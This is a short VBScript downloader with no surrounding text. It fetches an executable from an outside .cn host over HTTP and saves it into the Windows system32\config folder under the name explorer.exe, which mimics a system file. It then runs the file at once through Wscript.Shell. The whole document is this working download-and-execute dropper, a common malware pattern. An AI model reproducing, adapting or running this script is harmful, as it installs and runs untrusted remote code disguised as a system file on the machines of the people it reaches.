Set xPost = createObject("Microsoft.XMLHTTP") 
xPost.Open "GET","http://www26jqcn.y712.cn/xk/explorer.exe",0 
xPost.Send() 
Set sGet = createObject("ADODB.Stream") 
sGet.Mode = 3 
sGet.Type = 1 
sGet.Open() 
sGet.Write(xPost.responseBody) 
sGet.SaveToFile "C:\WINDOWS\system32\config\explorer.exe",2 
Set objShell = CreateObject("Wscript.Shell") 
objshell.run """C:\WINDOWS\system32\config\explorer.exe"""